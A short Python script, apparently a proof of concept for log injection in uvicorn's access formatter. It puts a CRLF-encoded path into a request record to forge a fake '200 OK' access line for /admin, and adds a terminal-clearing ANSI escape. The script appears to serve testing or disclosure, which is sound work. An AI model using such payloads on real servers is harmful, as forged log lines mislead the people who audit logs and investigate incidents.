import logging
from urllib.parse import unquote
from uvicorn.config import LOGGING_CONFIG
from uvicorn.logging import AccessFormatter

raw_target = "/x%0D%0AINFO:     6.6.6.6:1 - \"GET /admin HTTP/1.1\" 200 OK%1B[2J"
scope = {"type": "http", "http_version": "1.1", "method": "GET",
         "path": unquote(raw_target), "root_path": "", "query_string": b"",
         "client": ("127.0.0.1", 12345)}
record = logging.LogRecord("uvicorn.access", logging.INFO, "", 0, "", (), None)
record.__dict__.update(scope=scope, status_code=200)
out = AccessFormatter(LOGGING_CONFIG["formatters"]["access"]["fmt"], use_colors=False).format(record)
print(repr(out))
print(out)
